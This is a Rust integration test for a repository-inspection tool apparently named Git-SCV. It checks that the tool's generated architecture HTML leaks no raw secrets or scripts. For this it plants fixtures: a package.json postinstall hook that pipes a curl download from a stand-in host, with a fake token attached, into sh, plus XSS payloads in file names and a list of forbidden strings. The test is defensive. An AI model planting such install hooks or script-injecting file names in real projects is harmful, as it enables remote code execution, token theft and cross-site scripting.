mod common;

use std::fs;
use std::process::Command;

#[test]
fn architecture_html_is_generated_without_raw_target_html_js_or_secret_like_values() {
    let repo = common::temp_dir("visualization-contract-repo");
    let marker = "GIT_SCV_FAKE_TOKEN_DO_NOT_USE_123456";
    fs::write(
        repo.join("package.json"),
        format!(
            "{{\"scripts\":{{\"postinstall\":\"curl https://example.invalid/install.sh?token={marker}#frag | sh\"}}}}\n"
        ),
    )
    .unwrap();
    fs::write(
        repo.join("<img src=x onerror=alert(1)>.sh"),
        "#!/bin/sh\ntrue\n",
    )
    .unwrap();
    fs::write(repo.join("<script>alert(1).txt"), "untrusted text\n").unwrap();
    fs::write(repo.join("javascript:alert(1).md"), "untrusted text\n").unwrap();
    fs::write(repo.join(".env"), "TOKEN=not-read\n").unwrap();

    let out = common::temp_dir("visualization-contract-out").join("run");
    let inspect = Command::new(common::bin())
        .args(["inspect"])
        .arg(&repo)
        .arg("--out")
        .arg(&out)
        .output()
        .unwrap();
    assert_eq!(
        inspect.status.code(),
        Some(0),
        "stderr: {}",
        String::from_utf8_lossy(&inspect.stderr)
    );

    for name in [
        "architecture.html",
        "architecture_map.json",
        "relation_map.json",
        "source_landmarks.json",
        "visualization_index.json",
    ] {
        assert!(
            out.join(name).is_file(),
            "missing visualization artifact: {name}"
        );
    }

    let html = fs::read_to_string(out.join("architecture.html")).unwrap();
    assert!(html.contains("Git-SCV Architecture & Safety Synthesis"));
    assert!(html.contains("Execution Scenario Reachability"));
    assert!(html.contains("Script Relationship View"));
    assert!(html.contains("Security Gate Overlay"));
    assert!(html.contains("Source Landmarks"));
    assert!(html.contains("Safe claim made"));
    assert!(html.contains("false"));
    assert!(html.contains("raw content not included"));

    for forbidden in [
        marker,
        "token=GIT_SCV_FAKE_TOKEN_DO_NOT_USE_123456",
        "curl https://example.invalid/install.sh",
        "<script>alert",
        "onerror=alert(1)",
        "javascript:alert(1)",
        "fetch(",
        "XMLHttpRequest",
        "new Function",
        "eval(",
        "https://cdn",
    ] {
        assert!(
            !html.contains(forbidden),
            "architecture.html leaked or enabled forbidden content: {forbidden}"
        );
    }

    let index: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(out.join("visualization_index.json")).unwrap())
            .unwrap();
    assert_eq!(
        index["default_visualization"], "architecture.html",
        "{index}"
    );
    assert_eq!(
        index["privacy"]["raw_sensitive_content_included"], false,
        "{index}"
    );
    assert_eq!(
        index["privacy"]["target_repo_js_executed"], false,
        "{index}"
    );
    assert_eq!(
        index["privacy"]["external_network_required"], false,
        "{index}"
    );

    let manifest: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(out.join("artifact_manifest.json")).unwrap())
            .unwrap();
    assert!(
        manifest["artifacts"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item["name"] == "architecture.html" && item["validated"] == true),
        "{manifest}"
    );
}
